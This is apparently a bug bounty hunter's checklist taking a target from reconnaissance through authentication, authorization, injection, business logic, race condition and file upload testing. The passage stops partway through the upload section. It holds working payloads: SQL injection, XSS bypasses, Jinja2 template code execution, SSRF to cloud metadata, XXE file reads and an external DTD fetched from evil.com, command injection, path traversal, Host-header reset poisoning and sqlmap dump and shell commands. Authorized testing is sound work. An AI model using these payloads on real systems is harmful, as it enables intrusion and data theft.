# ☠️ Elite Bug Bounty Hunter Checklist
## The "Leave Nothing Alive" Methodology

> **Rules:** Go through this checklist for EVERY target. Check off each item. 
> If you skip items, you're leaving money on the table. Period.
> 
> This checklist assumes you already have your target selected and scope read.

---

# 🔍 PHASE 1: RECONNAISSANCE

## 1.1 Subdomain Enumeration

- [ ] **Subfinder** — passive subdomain enumeration
  ```bash
  subfinder -d target.com -all -recursive -o subs_subfinder.txt
  ```

- [ ] **Amass** — broader passive sources
  ```bash
  amass enum -passive -d target.com -o subs_amass.txt
  ```

- [ ] **Certificate Transparency**
  ```bash
  # crt.sh
  curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u > subs_crt.txt
  ```

- [ ] **GitHub/GitLab dorking** — subdomains leaked in code
  ```
  Search on github.com:
  "target.com" org:targetorg
  "*.target.com"
  "target.com" password
  "target.com" api_key
  "target.com" secret
  ```

- [ ] **Wayback Machine / Archive sources**
  ```bash
  waybackurls target.com | unfurl -u domains | sort -u > subs_wayback.txt
  ```

- [ ] **DNS brute force** (only if scope allows)
  ```bash
  # Use a good wordlist like n0kovo or assetnote
  puredns bruteforce /path/to/dns-wordlist.txt target.com -r resolvers.txt -w subs_brute.txt
  ```

- [ ] **Merge & deduplicate ALL subdomain sources**
  ```bash
  cat subs_*.txt | sort -u > all_subdomains.txt
  echo "[+] Total unique subdomains: $(wc -l < all_subdomains.txt)"
  ```

---

## 1.2 Subdomain Validation & Fingerprinting

- [ ] **Resolve alive hosts with httpx**
  ```bash
  cat all_subdomains.txt | httpx -silent -status-code -title -tech-detect \
    -follow-redirects -content-length -web-server -o alive_detailed.txt
  ```

- [ ] **Separate by interest level**
  ```bash
  # Flag anything with these keywords as HIGH PRIORITY:
  grep -iE 'staging|dev|test|debug|admin|internal|api|beta|sandbox|legacy|old|backup|jenkins|grafana|kibana|jira|gitlab|sonar' alive_detailed.txt > high_priority_subs.txt
  ```

- [ ] **Check for subdomain takeover**
  ```bash
  # Install: go install github.com/haccer/subjack@latest
  subjack -w all_subdomains.txt -t 50 -timeout 30 -ssl -o takeover_results.txt -v

  # Also manually check CNAME records for dangling references
  cat all_subdomains.txt | while read sub; do
    cname=$(dig +short CNAME "$sub")
    if [ ! -z "$cname" ]; then
      echo "$sub → $cname"
    fi
  done > cname_records.txt
  
  # Look for CNAMEs pointing to: github.io, herokuapp.com, 
  # s3.amazonaws.com, azurewebsites.net, etc.
  ```

- [ ] **Screenshot all alive hosts**
  ```bash
  # Install: go install github.com/sensepost/gowitness@latest
  gowitness file -f alive_detailed.txt -P screenshots/
  # Now VISUALLY review every screenshot. Your eyes catch things tools don't.
  ```

---

## 1.3 Port Scanning

- [ ] **Full port scan on interesting subdomains**
  ```bash
  # Top ports first (fast)
  naabu -list high_priority_subs.txt -top-ports 1000 -o ports_top.txt
  
  # Then full port range on the most interesting ones
  naabu -list interesting_ips.txt -p - -o ports_full.txt
  ```

- [ ] **Service fingerprinting on open ports**
  ```bash
  nmap -sV -sC -iL interesting_ips.txt -oN nmap_services.txt
  ```

- [ ] **Check for interesting services**
  ```
  Flag these if found:
  - Port 9200 → Elasticsearch (often unauthenticated)
  - Port 5601 → Kibana
  - Port 3000 → Grafana / custom apps
  - Port 8080/8443 → Admin panels, Tomcat
  - Port 6379 → Redis (try connecting without auth)
  - Port 27017 → MongoDB (try connecting without auth)
  - Port 9000 → SonarQube / PHP-FPM
  - Port 2375 → Docker API (CRITICAL if exposed)
  - Port 11211 → Memcached
  ```

---

## 1.4 Content Discovery

- [ ] **Directory brute force on main app**
  ```bash
  ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
    -mc 200,301,302,403,405 -fc 404 -ac -o dirs_main.json -of json -rate 100
  ```

- [ ] **File brute force with extensions**
  ```bash
  ffuf -u https://target.com/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
    -e .php,.asp,.aspx,.jsp,.json,.xml,.yml,.yaml,.env,.bak,.old,.sql,.zip,.tar.gz,.log,.txt,.config,.ini,.conf,.swp,.swo \
    -mc 200,301,302,403 -ac -o files_main.json -of json -rate 100
  ```

- [ ] **API endpoint discovery**
  ```bash
  ffuf -u https://target.com/api/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -mc 200,301,302,401,403,405 -ac -o api_endpoints.json -of json
  
  # Also try common API versioning
  for v in v1 v2 v3; do
    ffuf -u "https://target.com/api/$v/FUZZ" \
      -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
      -mc 200,301,302,401,403,405 -ac -o "api_${v}.json" -of json
  done
  ```

- [ ] **Check for sensitive files manually**
  ```bash
  # Run each of these:
  curl -sk https://target.com/.env
  curl -sk https://target.com/.git/config
  curl -sk https://target.com/.git/HEAD
  curl -sk https://target.com/.svn/entries
  curl -sk https://target.com/.DS_Store
  curl -sk https://target.com/robots.txt
  curl -sk https://target.com/sitemap.xml
  curl -sk https://target.com/crossdomain.xml
  curl -sk https://target.com/clientaccesspolicy.xml
  curl -sk https://target.com/.well-known/security.txt
  curl -sk https://target.com/server-status
  curl -sk https://target.com/server-info
  curl -sk https://target.com/elmah.axd
  curl -sk https://target.com/trace.axd
  curl -sk https://target.com/phpinfo.php
  curl -sk https://target.com/info.php
  curl -sk https://target.com/wp-config.php.bak
  curl -sk https://target.com/web.config
  curl -sk https://target.com/WEB-INF/web.xml
  curl -sk https://target.com/config.json
  curl -sk https://target.com/package.json
  curl -sk https://target.com/composer.json
  curl -sk https://target.com/Gruntfile.js
  curl -sk https://target.com/webpack.config.js
  curl -sk https://target.com/backup.sql
  curl -sk https://target.com/dump.sql
  curl -sk https://target.com/database.sql
  ```

- [ ] **Git exposure — dump full repo if .git is accessible**
  ```bash
  # If .git/config returns content:
  # Install: pip install git-dumper
  git-dumper https://target.com/.git/ target_git_dump/
  # Then search the ENTIRE git history for secrets
  cd target_git_dump && git log --all --oneline | head -50
  git log --all -p | grep -iE 'password|secret|api_key|token|credentials' | head -50
  ```

---

## 1.5 JavaScript Analysis

- [ ] **Collect ALL JavaScript files**
  ```bash
  # From wayback
  waybackurls target.com | grep -iE '\.js(\?|$)' | sort -u > js_urls.txt
  
  # From live crawl
  cat alive_detailed.txt | cut -d' ' -f1 | hakrawler -subs -d 2 | grep -iE '\.js(\?|$)' | sort -u >> js_urls.txt
  sort -u js_urls.txt -o js_urls.txt
  ```

- [ ] **Download and analyze JS files**
  ```bash
  mkdir -p js_files
  cat js_urls.txt | while read url; do
    fname=$(echo "$url" | md5sum | cut -c1-12).js
    curl -sk "$url" -o "js_files/$fname"
    echo "$url|$fname" >> js_index.txt
  done
  ```

- [ ] **Extract endpoints from JS**
  ```bash
  # Using grep
  grep -rhoP '["'\''`]/(api|v[0-9]|graphql|internal|admin|auth|user|account|dashboard)[a-zA-Z0-9_/\-\.]*' js_files/ | sort -u > js_api_endpoints.txt
  
  # Extract all relative paths
  grep -rhoP '["'\''`]/[a-zA-Z0-9_/?=&#\-\.]{3,}' js_files/ | sort -u > js_all_paths.txt
  
  # Using LinkFinder (better pattern matching)
  # Install: pip install linkfinder
  cat js_urls.txt | while read url; do
    python3 linkfinder.py -i "$url" -o cli 2>/dev/null
  done | sort -u > js_linkfinder_endpoints.txt
  ```

- [ ] **Extract secrets from JS**
  ```bash
  # API keys and tokens
  grep -rhi -E '(api[_-]?key|api[_-]?secret|access[_-]?token|auth[_-]?token|client[_-]?secret|private[_-]?key)\s*[:=]\s*["\x27][a-zA-Z0-9_\-]{10,}' js_files/
  
  # AWS keys
  grep -rhi -E 'AKIA[0-9A-Z]{16}' js_files/
  
  # Google API keys  
  grep -rhi -E 'AIza[0-9A-Za-z_\-]{35}' js_files/
  
  # Firebase URLs
  grep -rhi -E '[a-z0-9\-]+\.firebaseio\.com' js_files/
  
  # Generic secrets
  grep -rhi -E '(password|passwd|pwd|secret)\s*[:=]\s*["\x27][^\s"'\'']{6,}' js_files/
  
  # Hardcoded JWTs
  grep -rhi -E 'eyJ[A-Za-z0-9_\-]*\.eyJ[A-Za-z0-9_\-]*\.[A-Za-z0-9_\-]*' js_files/
  ```

- [ ] **Check for JS source maps (JACKPOT if found)**
  ```bash
  # Source maps expose ORIGINAL source code including comments
  cat js_urls.txt | while read url; do
    mapurl="${url}.map"
    status=$(curl -sk -o /dev/null -w "%{http_code}" "$mapurl")
    if [ "$status" = "200" ]; then
      echo "[FOUND] $mapurl"
      curl -sk "$mapurl" -o "js_files/$(echo $mapurl | md5sum | cut -c1-12).map"
    fi
  done
  ```

- [ ] **Scan for hidden parameters in JS**
  ```bash
  grep -rhoP '([\?&]|params\[?["\x27]|param\s*[:=]\s*["\x27])\K[a-zA-Z0-9_]+' js_files/ | sort -u > js_hidden_params.txt
  ```

---

## 1.6 Google Dorking

- [ ] **Run these dorks on Google**
  ```
  site:target.com filetype:pdf
  site:target.com filetype:doc OR filetype:docx
  site:target.com filetype:xls OR filetype:xlsx
  site:target.com filetype:sql
  site:target.com filetype:log
  site:target.com filetype:env
  site:target.com inurl:admin
  site:target.com inurl:login
  site:target.com inurl:dashboard
  site:target.com inurl:api
  site:target.com inurl:debug
  site:target.com intitle:"index of"
  site:target.com ext:php intitle:phpinfo
  site:target.com inurl:wp-content (WordPress check)
  site:target.com "error" OR "exception" OR "stack trace"
  site:target.com "not for distribution" OR "confidential"
  site:target.com "forgot password" OR "reset password"
  ```

---

# 🔐 PHASE 2: AUTHENTICATION TESTING

## 2.1 Registration

- [ ] **Duplicate registration** — Can I register with an email that's already taken using case manipulation?
  ```
  Original: user@target.com
  Try: User@target.com, USER@TARGET.COM, user@Target.com
  Try: user+anything@target.com (Gmail-style)
  Try: user@target.com (add invisible Unicode characters)
  Try: user@target.com%00 (null byte)
  Try: user@target.com\n (newline)
  ```

- [ ] **Weak password policy** — Does it accept "password", "123456", single char passwords?

- [ ] **Registration parameter tampering**
  ```
  Add to registration request body:
  "role": "admin"
  "is_admin": true
  "user_type": "administrator"
  "admin": 1
  "group": "admin"
  "privilege": "high"
  ```

- [ ] **Email verification bypass**
  ```
  - Register → Don't verify → Can you still access features?
  - Register → Manipulate the verification token (make it blank, null, predictable)
  - Register → Use expired/another user's verification link
  ```

- [ ] **Username/email enumeration** — Does registration say "email already exists" vs generic error?

---

## 2.2 Login

- [ ] **Default credentials check**
  ```
  admin:admin
  admin:password
  admin:123456
  root:root
  test:test
  administrator:administrator
  ```

- [ ] **Brute force protection test**
  ```
  - Send 50+ login requests with wrong password
  - Is there any lockout? Rate limiting? CAPTCHA?
  - If locked out: does changing IP bypass it? (X-Forwarded-For header)
  - If CAPTCHA: can I still brute force the API directly?
  ```

  ```bash
  # Rate limit bypass headers — add these one at a time:
  X-Forwarded-For: 127.0.0.1
  X-Originating-IP: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Remote-Addr: 127.0.0.1
  X-Client-IP: 127.0.0.1
  X-Real-IP: 127.0.0.1
  True-Client-IP: 127.0.0.1
  X-Forwarded-Host: localhost
  ```

- [ ] **SQL injection in login**
  ```
  Username: admin' OR '1'='1'-- -
  Username: admin'--
  Username: ' OR 1=1-- -
  Password: ' OR '1'='1'-- -
  ```

- [ ] **Response manipulation** — Intercept login response, change `{"success":false}` to `{"success":true}`

- [ ] **Login with another user's token/session after logout** — Does logout actually invalidate the session?

---

## 2.3 Password Reset

- [ ] **Password reset token analysis**
  ```
  - Request 10 reset tokens — is there a pattern? Sequential? Timestamp-based?
  - Is the token short enough to brute force?
  - Does the token expire? After how long?
  - Can I use the same token multiple times?
  ```

- [ ] **Password reset poisoning (Host header attack)**
  ```
  POST /forgot-password HTTP/1.1
  Host: evil.com               ← Change Host header
  
  POST /forgot-password HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com   ← Add this header
  
  # If the reset email contains a link with YOUR domain,
  # you can steal reset tokens for ANY user
  ```

- [ ] **IDOR in password reset**
  ```
  - Change user_id/email in the reset request to victim's
  - Change the token validation request to apply to a different account
  ```

- [ ] **Password reset via referrer leakage**
  ```
  - Get a reset link
  - Click it, then click any external link on the page
  - Check if the reset token appears in the Referer header
  ```

---

## 2.4 Session Management

- [ ] **Session token entropy** — Is the session token random enough? Check with Burp Sequencer.

- [ ] **Session fixation** — Can I set a session token before login and keep it after login?

- [ ] **Concurrent sessions** — Login from two devices. Does the first session get invalidated? (it usually shouldn't for usability, but check if there's a limit at all)

- [ ] **Session token in URL** — Is the token ever passed in a URL parameter? (leaks via Referer header)

- [ ] **Cookie flags check**
  ```
  Check every cookie for:
  - [ ] HttpOnly flag (prevents JS access — XSS can't steal it)
  - [ ] Secure flag (only sent over HTTPS)
  - [ ] SameSite flag (CSRF protection)
  - [ ] Reasonable expiration (not year 2099)
  ```

- [ ] **JWT analysis (if using JWTs)**
  ```bash
  # Decode the JWT
  echo "eyJ..." | cut -d'.' -f1 | base64 -d 2>/dev/null | jq .
  echo "eyJ..." | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
  
  # Test algorithm confusion
  # Change "alg":"RS256" to "alg":"HS256" in header
  # Sign with the PUBLIC key as a symmetric key
  
  # Test "alg":"none"
  # Change header to {"alg":"none","typ":"JWT"}
  # Remove the signature (third part)
  # Try: eyJ...header.eyJ...payload.
  # Try: eyJ...header.eyJ...payload
  
  # Test with empty signature
  # Change claims (admin: true, user_id, role, etc.)
  
  # Crack weak JWT secrets
  # Install: go install github.com/lmammino/jwt-cracker@latest
  # Or use hashcat:
  hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
  ```

- [ ] **OAuth/SSO testing** (if present)
  ```
  - [ ] Open redirect in redirect_uri → steal auth code
  - [ ] Modify state parameter → CSRF
  - [ ] Reuse authorization code
  - [ ] Token leakage in browser history/logs
  - [ ] Missing redirect_uri validation
  - [ ] Link existing account to attacker's OAuth → account takeover
  ```

---

## 2.5 Multi-Factor Authentication (MFA)

- [ ] **Skip MFA step** — After login, go directly to /dashboard instead of /verify-mfa
- [ ] **Brute force MFA code** — Usually 4-6 digits. Is there rate limiting?
- [ ] **Reuse MFA code** — Does a code work multiple times?
- [ ] **Response manipulation** — Change MFA verification response from fail to success
- [ ] **Backup codes** — Are they predictable? Can they be brute forced?
- [ ] **Disable MFA** — Can you disable MFA from settings without entering current MFA?

---

# 🔓 PHASE 3: AUTHORIZATION TESTING

> **SETUP: Create at minimum 2 accounts. Account A (attacker) and Account B (victim).**
> If possible, also get an admin account or identify admin endpoints.

## 3.1 Horizontal Authorization (IDOR)

- [ ] **Test EVERY endpoint with an ID parameter**
  ```
  For each request containing a numeric ID, UUID, or any identifier:
  
  1. Log in as User A
  2. Find a request: GET /api/users/123/profile
  3. Change 123 to User B's ID (124)
  4. Did you get User B's data?
  
  Test on: GET, POST, PUT, PATCH, DELETE methods
  ```

- [ ] **IDOR via parameter pollution**
  ```
  GET /api/profile?user_id=123&user_id=124
  # Some servers take the first, some take the last, some merge
  ```

- [ ] **IDOR via different content types**
  ```
  # If the API accepts JSON:
  POST /api/profile
  {"user_id": 123}
  
  # Try XML:
  POST /api/profile
  Content-Type: application/xml
  <user_id>123</user_id>
  
  # The backend might parse differently and skip auth checks
  ```

- [ ] **IDOR in file operations**
  ```
  GET /api/documents/download?file_id=abc123
  GET /api/invoices/pdf?invoice=INV-001
  GET /api/attachments?name=../../etc/passwd   ← also path traversal
  ```

- [ ] **IDOR in non-obvious places**
  ```
  Check IDs in:
  - Email notification preferences
  - Billing/invoice endpoints
  - Support ticket endpoints
  - Report/analytics endpoints
  - Export/download endpoints
  - Webhook configurations
  - API key management
  - Team/organization membership
  ```

- [ ] **UUID/GUID prediction**
  ```
  - Are UUIDs v1? (they contain timestamps and MAC — predictable!)
  - Collect 10 UUIDs — is there a pattern?
  - Can you find UUIDs leaked in API responses, HTML source, JS?
  ```

---

## 3.2 Vertical Authorization (Privilege Escalation)

- [ ] **Access admin endpoints as regular user**
  ```
  Use all admin/internal endpoints found during JS analysis and recon.
  Test each one with a regular user's session token.
  
  Common admin endpoints:
  /admin, /admin/dashboard, /admin/users, /admin/settings
  /api/admin/*, /api/internal/*, /api/management/*
  /graphql (admin mutations)
  ```

- [ ] **HTTP method tampering**
  ```
  If GET /admin returns 403:
  Try: POST /admin
  Try: PUT /admin
  Try: PATCH /admin
  Try: DELETE /admin
  Try: OPTIONS /admin
  Try: HEAD /admin
  Try: TRACE /admin
  ```

- [ ] **Path traversal for auth bypass**
  ```
  If /admin returns 403:
  Try: /admin/
  Try: /admin/.
  Try: //admin
  Try: /./admin
  Try: /admin..;/
  Try: /%2f/admin
  Try: /admin;
  Try: /admin/~
  Try: /ADMIN (case change)
  Try: /admin%20
  Try: /admin%09
  Try: /admin?anything
  Try: /admin#anything
  Try: /admin.json
  Try: /admin.css
  ```

- [ ] **Role parameter tampering**
  ```
  On ANY update/profile endpoint, try adding:
  {"role":"admin"}
  {"isAdmin":true}
  {"admin":1}
  {"access_level":"admin"}
  {"user_role":"administrator"}
  {"privilege":"high"}
  {"group_id": 1}          ← if 1 = admin group
  ```

- [ ] **Forced browsing** — Access /admin, /debug, /internal, /management directly

---

## 3.3 403 Bypass Techniques

- [ ] **Run all 403 bypass techniques**
  ```bash
  TARGET="https://target.com/admin"
  
  # Header-based bypasses
  curl -sk -H "X-Original-URL: /admin" "https://target.com/"
  curl -sk -H "X-Rewrite-URL: /admin" "https://target.com/"
  curl -sk -H "X-Custom-IP-Authorization: 127.0.0.1" "$TARGET"
  curl -sk -H "X-Forwarded-For: 127.0.0.1" "$TARGET"
  curl -sk -H "X-Forwarded-Host: 127.0.0.1" "$TARGET"
  curl -sk -H "X-Host: 127.0.0.1" "$TARGET"
  curl -sk -H "X-Remote-IP: 127.0.0.1" "$TARGET"
  curl -sk -H "X-Remote-Addr: 127.0.0.1" "$TARGET"
  curl -sk -H "Referer: https://target.com/admin" "$TARGET"
  
  # Path-based bypasses
  curl -sk "https://target.com/%2e/admin"
  curl -sk "https://target.com/admin%20"
  curl -sk "https://target.com/admin%09"
  curl -sk "https://target.com/admin%00"
  curl -sk "https://target.com/admin/.randomstring"
  curl -sk "https://target.com/admin..;/"
  curl -sk "https://target.com/;/admin"
  curl -sk "https://target.com/.;/admin"
  ```

---

# 💉 PHASE 4: INJECTION TESTING

## 4.1 Cross-Site Scripting (XSS)

- [ ] **Identify ALL reflection points** — Where does user input appear in the response?
  ```
  Search for reflection in:
  - Search bars/results
  - Error messages ("X not found")
  - Profile fields (name, bio, address)
  - Comments and posts
  - URL parameters reflected in page
  - HTTP headers reflected in response
  - File upload names
  - Contact/support forms
  ```

- [ ] **Test reflected XSS on EVERY parameter**
  ```
  Basic tests (start simple, escalate):
  
  1. <script>alert(1)</script>
  2. <img src=x onerror=alert(1)>
  3. <svg onload=alert(1)>
  4. "><script>alert(1)</script>
  5. '><script>alert(1)</script>
  6. javascript:alert(1)
  7. <details open ontoggle=alert(1)>
  8. <marquee onstart=alert(1)>
  ```

- [ ] **Filter bypass payloads**
  ```
  Case variation:     <ScRiPt>alert(1)</sCrIpT>
  Double encoding:    %253Cscript%253Ealert(1)%253C/script%253E
  Null byte:          <scri%00pt>alert(1)</scri%00pt>
  Tag manipulation:   <scr<script>ipt>alert(1)</scr</script>ipt>
  Event handlers:     <img src=x oNerRor=alert(1)>
  SVG:                <svg/onload=alert(1)>
  Math:               <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
  Without parens:     <img src=x onerror=alert`1`>
  Without alert:      <img src=x onerror=confirm(1)>
  Without brackets:   <img src=x onerror=window.onerror=alert;throw+1>
  Template literal:   ${alert(1)}
  Unicode:            <img src=x onerror=\u0061lert(1)>
  ```

- [ ] **Stored XSS** — Test in ALL fields that save data
  ```
  Profile name, bio, address, company
  Comments, posts, messages
  File names on upload
  Custom URLs/slugs
  Team/org names
  Product names/descriptions
  Support ticket content
  ```

- [ ] **DOM XSS** — Check JavaScript sinks
  ```
  Sources to look for:
  document.URL, document.location, document.referrer, 
  window.name, location.hash, location.search
  
  Sinks to look for:
  document.write(), innerHTML, outerHTML, eval(),
  setTimeout(), setInterval(), Function(),
  $.html(), element.src, location.href
  
  Test: Add your payload to URL fragments (#), query params, etc.
  Example: https://target.com/page#<img src=x onerror=alert(1)>
  ```

---

## 4.2 SQL Injection

- [ ] **Test EVERY input parameter for SQLi**
  ```
  Basic detection:
  '           → SQL error?
  ''          → error goes away?
  ' OR '1'='1 → different behavior?
  ' AND '1'='2 → different behavior?
  1 OR 1=1    → (for numeric params)
  1 AND 1=2   → different behavior?
  ' WAITFOR DELAY '0:0:5'-- → time delay? (blind SQLi)
  1; WAITFOR DELAY '0:0:5'--
  ' OR SLEEP(5)-- -   → MySQL time-based
  '; SELECT pg_sleep(5)-- → PostgreSQL
  ```

- [ ] **SQLMap for confirmed injection points**
  ```bash
  # Save the vulnerable request from Burp as request.txt
  sqlmap -r request.txt --batch --random-agent --level 3 --risk 2
  
  # If found, escalate:
  sqlmap -r request.txt --batch --dbs          # list databases
  sqlmap -r request.txt --batch -D dbname --tables  # list tables
  sqlmap -r request.txt --batch -D dbname -T users --dump  # dump data
  sqlmap -r request.txt --batch --os-shell      # try to get shell
  ```

- [ ] **Test in non-obvious places**
  ```
  SQL injection in:
  - Sort/order parameters: ?sort=name ASC; DROP TABLE--
  - Filter parameters: ?category=1 UNION SELECT...
  - Cookie values
  - User-Agent header
  - Referer header
  - X-Forwarded-For header
  - JSON body parameters
  - XML body parameters
  ```

---

## 4.3 Server-Side Template Injection (SSTI)

- [ ] **Detection payloads**
  ```
  {{7*7}}              → If output is 49, SSTI confirmed
  ${7*7}               → Java EL/Freemarker
  #{7*7}               → Ruby ERB
  {{7*'7'}}            → If output is 7777777, Jinja2 (Python)
  {{config}}           → Jinja2 config dump
  {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}  → Jinja2 RCE
  ```

- [ ] **Where to test**
  ```
  - Email templates (custom greeting, etc.)
  - PDF generators (invoice templates)
  - Custom page builders
  - Notification templates
  - Any "template" or "preview" feature
  ```

---

## 4.4 Server-Side Request Forgery (SSRF)

- [ ] **Identify SSRF entry points**
  ```
  Look for ANY feature that fetches external resources:
  - Webhook URLs
  - URL preview/unfurling (Slack-style link previews)
  - Image fetch from URL
  - PDF generation from URL
  - Import from URL
  - "Connect" integrations
  - Avatar/profile picture from URL
  - RSS feed reader
  - Any parameter named: url, uri, path, dest, redirect, src, source, link, img, imageURL, webhookUrl
  ```

- [ ] **Test SSRF payloads**
  ```
  # 1. Confirm SSRF with external callback
  Use Burp Collaborator or interactsh:
  interactsh-client  # gives you a unique domain
  # Put that URL in the vulnerable parameter
  
  # 2. Try internal access
  http://127.0.0.1
  http://localhost
  http://0.0.0.0
  http://[::1]               # IPv6 localhost
  http://127.0.0.1:8080      # internal services
  http://127.0.0.1:3000
  http://127.0.0.1:9200      # Elasticsearch
  http://127.0.0.1:6379      # Redis
  
  # 3. Cloud metadata (CRITICAL — this is an instant bounty)
  # AWS:
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.169.254/latest/user-data/
  # GCP:
  http://metadata.google.internal/computeMetadata/v1/
  # Azure:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  ```

- [ ] **SSRF filter bypass**
  ```
  # If they block 127.0.0.1:
  http://0x7f000001          # Hex
  http://2130706433          # Decimal
  http://017700000001        # Octal
  http://127.0.0.1.nip.io   # DNS rebinding
  http://127.1               # Short form
  http://0                   # Zero
  http://localhost            # Maybe not blocked?
  
  # If they block by checking start of URL:
  http://evil.com#@127.0.0.1
  http://evil.com@127.0.0.1
  http://127.0.0.1%2523@evil.com
  
  # Protocol smuggling:
  gopher://127.0.0.1:6379/_INFO     # Redis via SSRF
  dict://127.0.0.1:6379/INFO
  file:///etc/passwd                  # Local file read via SSRF
  ```

---

## 4.5 XML External Entity (XXE)

- [ ] **Find XML parsing endpoints**
  ```
  Look for:
  - Any endpoint accepting Content-Type: application/xml
  - File uploads accepting .xml, .svg, .xlsx, .docx
  - SOAP endpoints
  - RSS/Atom feed imports
  - SAML authentication
  ```

- [ ] **Test XXE payloads**
  ```xml
  <!-- Basic file read -->
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root>&xxe;</root>
  
  <!-- SSRF via XXE -->
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://your-collaborator.burpcollaborator.net">
  ]>
  <root>&xxe;</root>
  
  <!-- Blind XXE with external DTD -->
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
    %xxe;
  ]>
  <root>test</root>
  
  <!-- SVG XXE (upload as profile picture) -->
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
  </svg>
  ```

---

## 4.6 Command Injection

- [ ] **Test every parameter that might interact with the OS**
  ```
  Targets: filename parameters, ping tools, DNS lookup tools,
           any "tool" feature, image processing, PDF conversion
  
  ; id
  | id
  || id
  & id
  && id
  $(id)
  `id`
  ; sleep 10
  | sleep 10
  %0a id          # newline
  %0d%0a id       # CRLF
  ```

---

## 4.7 Path Traversal / Local File Inclusion

- [ ] **Test file-related parameters**
  ```
  Original: ?file=report.pdf
  
  Try:
  ?file=../../../etc/passwd
  ?file=....//....//....//etc/passwd
  ?file=..%2f..%2f..%2fetc%2fpasswd
  ?file=..%252f..%252f..%252fetc%252fpasswd  (double encode)
  ?file=/etc/passwd
  ?file=file:///etc/passwd
  ?file=php://filter/convert.base64-encode/resource=index.php  (PHP)
  ?file=....\/....\/....\/etc/passwd  (Windows path separator bypass)
  
  Windows:
  ?file=..\..\..\windows\system32\drivers\etc\hosts
  ?file=C:\windows\win.ini
  ```

---

# 🏗️ PHASE 5: BUSINESS LOGIC TESTING

> **These bugs can NEVER be found by scanners. This is your edge.**

## 5.1 Price/Value Manipulation

- [ ] **Negative amounts**
  ```
  Change price: 100 → -100
  Change quantity: 1 → -1  
  Change discount: 10 → 100 (or 200 for negative price)
  Change tax: positive → negative
  ```

- [ ] **Zero amount**
  ```
  Price: 0
  Quantity: 0 (does it still process?)
  Shipping: change to 0
  ```

- [ ] **Decimal/rounding abuse**
  ```
  Price: 0.001 (rounds down to 0?)
  Quantity: 0.1 (get partial item at full functionality?)
  Transfer: $0.001 × 100000 times
  ```

- [ ] **Currency confusion**
  ```
  Change currency parameter from USD to a weaker currency
  Changed from INR to USD but kept the number the same
  ```

- [ ] **Race condition on payment/checkout** → See Phase 6

---

## 5.2 Feature Abuse

- [ ] **Coupon/discount abuse**
  ```
  - Apply same coupon twice
  - Apply multiple coupons when only one should be allowed
  - Apply coupon after payment
  - Modify coupon percentage in request
  - Race condition: apply coupon simultaneously
  ```

- [ ] **Referral abuse**
  ```
  - Refer yourself (different email, same person)
  - Get reward → cancel the referred account → keep reward?
  - Modify referral count in request
  ```

- [ ] **Step skipping** (multi-step processes)
  ```
  For ANY multi-step flow (checkout, KYC, onboarding):
  - Skip directly to the last step
  - Go from step 1 to step 3 (skip 2)
  - Go backwards after completing
  - Modify step state in the request
  ```

- [ ] **Limit bypass**
  ```
  - Free tier allows 5 projects? Create 6th via API
  - Can only send 10 messages/day? Check if API has the same limit
  - Can only upload 5MB? Modify Content-Length header
  - Trial expired? Modify expiry in request/cookie/JWT
  ```

---

## 5.3 Email-Related Logic Bugs

- [ ] **Email address parsing issues**
  ```
  victim@target.com%0a%0dcc:attacker@evil.com    → Header injection
  victim@target.com\ncc:attacker@evil.com         → Newline injection
  "victim@target.com\nattacker@evil.com"           → Multiple recipients
  ```

---

# ⚡ PHASE 6: RACE CONDITION TESTING

- [ ] **Identify race-prone features**
  ```
  ANYTHING that should only happen ONCE:
  - Apply coupon code
  - Redeem gift card
  - Like/upvote
  - Follow user
  - Transfer money
  - Claim reward
  - Use invite code
  - Activate trial
  - Vote in poll
  - Purchase limited stock item
  ```

- [ ] **Test with Burp Suite Repeater (Parallel Send)**
  ```
  1. Capture the request in Burp
  2. Send to Repeater
  3. Create 20-30 tabs with the SAME request
  4. Select all tabs → Right click → "Send group (parallel)"
  5. Check: did the action execute more than once?
  ```

- [ ] **Test with Turbo Intruder (More Control)**
  ```python
  # Turbo Intruder script
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=30,
                            requestsPerConnection=100,
                            pipeline=False)
      for i in range(30):
          engine.queue(target.req, target.baseInput, gate='race1')
      engine.openGate('race1')  # Releases all requests at once
  
  def handleResponse(req, interesting):
      table.add(req)
  ```

- [ ] **Test with curl (Simple)**
  ```bash
  # Send 20 identical requests simultaneously
  for i in $(seq 1 20); do
    curl -sk -X POST "https://target.com/api/redeem" \
      -H "Cookie: session=YOUR_SESSION" \
      -H "Content-Type: application/json" \
      -d '{"code":"COUPON123"}' &
  done
  wait
  ```

---

# 📁 PHASE 7: FILE UPLOAD TESTING

- [ ] **Test file type restrictions**
  ```
  If only images are allowed, try uploading:
  - .php, .php5, .phtml, .phar          → PHP webshells
  - .asp, .aspx                          → ASP webshells
  - .jsp, .jspx                          → Java webshells
  - .svg                                 → SVG XSS / XXE
  - .html, .htm                          → Stored XSS
  - .pdf                                 → PDF with JS
  - .xml                                 → XXE
  - .xxe                                 → XXE
  - .config                              → IIS config
  ```

- [ ] **Bypass extension filters**
  ```
  shell.php.jpg          → Double extension
  shell.php%00.jpg       → Null byte (old systems)
